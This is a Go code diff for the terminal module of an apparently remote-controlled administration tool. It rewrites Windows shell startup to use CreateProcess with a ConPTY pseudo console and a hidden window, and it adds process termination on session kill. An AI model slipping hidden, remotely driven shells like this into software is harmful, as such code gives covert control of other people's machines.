@@ -13,10 +13,13 @@ import (
 	"os"
 	"os/exec"
 	"reflect"
+	"runtime"
 	"sync"
 	"syscall"
 	"time"
 	"unsafe"
+
+	windows "golang.org/x/sys/windows"
 )
 
 var (
@@ -40,18 +43,19 @@ type COORD struct {
 }
 
 type terminal struct {
-	lastPack  int64
-	rawEvent  []byte
-	escape    bool
-	event     string
-	cmd       *exec.Cmd
-	hPC       uintptr // Pseudo Console handle
-	ptyIn     *os.File
-	ptyOut    *os.File
-	stdin     io.WriteCloser
-	stdout    io.ReadCloser
-	useLegacy bool // fallback to pipes if ConPTY not available
-	mu        sync.Mutex
+	lastPack   int64
+	rawEvent   []byte
+	escape     bool
+	event      string
+	cmd        *exec.Cmd
+	procHandle windows.Handle
+	hPC        uintptr // Pseudo Console handle
+	ptyIn      *os.File
+	ptyOut     *os.File
+	stdin      io.WriteCloser
+	stdout     io.ReadCloser
+	useLegacy  bool // fallback to pipes if ConPTY not available
+	mu         sync.Mutex
 }
 
 var terminals = cmap.New[*terminal]()
@@ -113,6 +117,36 @@ func createPseudoConsole(cols, rows int16) (hPC uintptr, ptyIn, ptyOut *os.File,
 	return hPC, ptyIn, ptyOut, nil
 }
 
+func startConPTYShell(session *terminal) error {
+	attrList, err := windows.NewProcThreadAttributeList(1)
+	if err != nil {
+		return err
+	}
+	defer attrList.Delete()
+
+	h := windows.Handle(session.hPC)
+	if err := attrList.Update(windows.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, unsafe.Pointer(&h), unsafe.Sizeof(h)); err != nil {
+		return err
+	}
+
+	var si windows.StartupInfoEx
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.StartupInfo.Flags = windows.STARTF_USESHOWWINDOW
+	si.StartupInfo.ShowWindow = windows.SW_HIDE
+	si.ProcThreadAttributeList = attrList.List()
+
+	cmdLine := windows.StringToUTF16(getTerminal())
+	pi := new(windows.ProcessInformation)
+	flags := uint32(windows.CREATE_UNICODE_ENVIRONMENT | windows.EXTENDED_STARTUPINFO_PRESENT)
+	if err := windows.CreateProcess(nil, &cmdLine[0], nil, nil, false, flags, nil, nil, &si.StartupInfo, pi); err != nil {
+		return err
+	}
+	windows.CloseHandle(pi.Thread)
+	session.procHandle = pi.Process
+	runtime.KeepAlive(cmdLine)
+	return nil
+}
+
 func InitTerminal(pack modules.Packet) error {
 	rawEvent, _ := hex.DecodeString(pack.Event)
 	session := &terminal{
@@ -131,23 +165,13 @@ func InitTerminal(pack modules.Packet) error {
 			session.ptyOut = ptyOut
 			session.useLegacy = false
 
-			// Start process with pseudo console
-			cmd := exec.Command(getTerminal())
-			cmd.SysProcAttr = &syscall.SysProcAttr{
-				HideWindow: true,
-			}
-
-			// Create process with ConPTY (simplified - using standard stdin for now)
-			session.stdin = ptyIn
-			session.stdout = ptyOut
-			session.cmd = cmd
-
-			// Start the command
-			if err := cmd.Start(); err != nil {
+			if err := startConPTYShell(session); err != nil {
 				procClosePseudoConsole.Call(hPC)
 				ptyIn.Close()
 				ptyOut.Close()
-				// Fall through to legacy mode
+				session.hPC = 0
+				session.ptyIn = nil
+				session.ptyOut = nil
 			} else {
 				terminals.Set(pack.Data[`terminal`].(string), session)
 				go readConPTY(session)
@@ -388,6 +412,12 @@ func doKillTerminal(terminal *terminal) {
 	defer terminal.mu.Unlock()
 
 	terminal.escape = true
+
+	if terminal.procHandle != 0 {
+		_ = windows.TerminateProcess(terminal.procHandle, 0)
+		windows.CloseHandle(terminal.procHandle)
+		terminal.procHandle = 0
+	}
 
 	if !terminal.useLegacy {
 		// ConPTY cleanup
